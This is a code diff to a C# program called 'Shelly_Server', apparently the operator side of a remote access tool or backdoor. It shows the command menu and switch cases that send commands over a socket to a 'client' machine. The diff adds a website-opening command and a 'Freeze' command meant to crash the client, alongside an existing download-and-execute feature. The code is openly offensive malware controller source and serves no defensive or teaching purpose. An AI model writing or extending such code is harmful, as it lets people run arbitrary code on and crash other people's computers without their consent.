@@ -26,10 +26,12 @@ namespace Shelly_Server
                         "2. Disconnect - Shuts down the shell until next system startup\n" +
                         "3. Ping - Pings the client and shows the response\n" + 
                         "4. MessageBox - Shows a messagebox on the clients computer\n" +
-                        "5. DownloadAndExecute - Downloads and executes a file\n\n" +
+                        "5. DownloadAndExecute - Downloads and executes a file\n" +
+                        "6. OpenWebsite - Opens a website using the IE browser\n\n" +
 
                         "FUN\n" +
-                        "1. ChangeWallpaper - Changes client desktop wallpaper\n\n" +
+                        "1. ChangeWallpaper - Changes client desktop wallpaper\n" +
+                        "2. Freeze - Freezes and eventually crashes the client computer\n\n" +
 
                         "POWER OPTIONS\n" +
 
@@ -89,16 +91,35 @@ namespace Shelly_Server
                     SocketHandler.Send(CommandPS + Functions.UserInput.GetMessageBoxInput());
                     break;
 
+                // Download and execute
                 case "downloadandexecute":
 
                     // Send message
                     SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(1));
                     break;
 
+                // Open website
+                case "openwebsite":
+
+                    // Send message
+                    SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(3));
+                    break;
+
+                // Change wallpaper
                 case "changewallpaper":
 
+                    // Send message
                     SocketHandler.Send(CommandPS + Functions.UserInput.GetLinkInput(2));
+                    break;
 
+                // Freeze
+                case "freeze":
+
+                    // Send message
+                    SocketHandler.Send(Command);
+
+                    // Disconnect and exit
+                    SocketHandler.ShutdownServer();
                     break;
 
                 // Shutdown client computer
